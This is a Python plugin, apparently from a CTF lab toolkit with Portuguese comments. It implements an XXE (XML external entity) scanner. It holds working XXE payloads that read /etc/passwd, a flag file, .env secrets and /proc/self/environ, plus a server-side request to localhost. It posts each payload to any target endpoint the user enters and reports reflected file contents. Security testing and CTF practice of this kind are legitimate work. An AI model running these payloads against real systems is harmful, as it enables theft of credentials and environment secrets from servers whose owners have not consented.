"""
plugins/xxe.py — plugin: XXE (XML External Entity) scanner.

Testa injeção de entidade externa XML em endpoints que consomem XML.
"""

from __future__ import annotations

import httpx
from rich.console import Console

from ctflab.core.session import Session
from ctflab.cli.ui import ask, askctx, scan_table

PLUGIN_NAME = "XXE Scanner"
PLUGIN_DESC = "Detecta XML External Entity injection — lê arquivos via XML"

# payloads XXE clássicos
_XXE_PAYLOADS = [
    (
        "etc/passwd (básico)",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "root:",
    ),
    (
        "flag.txt",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><root>&xxe;</root>',
        "CTF{",
    ),
    (
        ".env",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.env">]><root>&xxe;</root>',
        "SECRET",
    ),
    (
        "proc/self/environ",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
        "PATH=",
    ),
    (
        "SSRF para localhost",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
        "",  # qualquer 200 é suspeito
    ),
]


def run(session: Session, console: Console) -> None:
    console.rule("[head]XXE SCANNER (plugin)[/head]")
    console.print(
        "[dim]Envia payloads XML com entidade externa e verifica se o conteúdo\n"
        "do arquivo aparece na resposta (XXE refletido).[/dim]\n"
    )

    path = askctx(session, "path", "path", "/api/import")

    table = scan_table(
        "XXE — payloads",
        ["alvo", "status", "refletido?", "snippet"],
    )

    hits = 0
    headers_xml = {
        "Content-Type": "application/xml",
        **session.headers,
    }

    with httpx.Client(
        base_url=session.target,
        headers=headers_xml,
        timeout=session.timeout,
        follow_redirects=True,
        verify=session.ssl,
    ) as cl:
        for label, payload, signal in _XXE_PAYLOADS:
            try:
                r       = cl.post(path, content=payload.encode())
                code    = r.status_code
                found   = signal.lower() in r.text.lower() if signal else code == 200
                style   = "ok" if found else "fail"
                hit_str = "[ok]sim[/ok]" if found else "[fail]não[/fail]"
                snippet = r.text[:55].replace("\n", " ")

                if found:
                    hits += 1
                    session.note(f"XXE hit: {label} [{code}]")
            except Exception as exc:
                code, style, hit_str, snippet = 0, "fail", "-", str(exc)[:40]

            table.add_row(label, f"[{style}]{code}[/{style}]", hit_str, snippet)

    console.print(table)
    if hits:
        console.print(f"\n[ok]{hits} payload(s) com reflexo detectado![/ok]")
    else:
        console.print("\n[fail]nenhum XXE refletido detectado[/fail]")
        console.print("[dim]endpoints XML costumam aceitar Content-Type: application/xml[/dim]")
